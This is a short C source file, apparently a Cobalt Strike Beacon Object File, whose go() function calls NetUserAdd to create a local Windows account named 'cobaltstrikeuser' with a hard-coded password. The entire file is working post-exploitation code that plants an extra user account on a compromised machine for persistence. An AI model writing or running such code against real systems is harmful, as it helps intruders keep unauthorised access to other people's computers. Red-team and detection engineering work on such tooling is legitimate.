#include <windows.h>
#include "beacon.h"
#include <lmaccess.h>

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR,DWORD,LPBYTE,LPDWORD);

void go(char* args, int len) 
{
	//datap parser;	
	//BeaconDataParse(&parser, args, len);
		
	//LPCWSTR *groupname;
	//groupname = BeaconDataExtract(&parser, NULL);
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS net_api_status;

	wchar_t user[] = L"cobaltstrikeuser";
	wchar_t pwd[] = L"cobaltstrikepassword";

	ui.usri1_name = user; 
	ui.usri1_password = pwd;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	net_api_status = NETAPI32$NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);

	return;
}

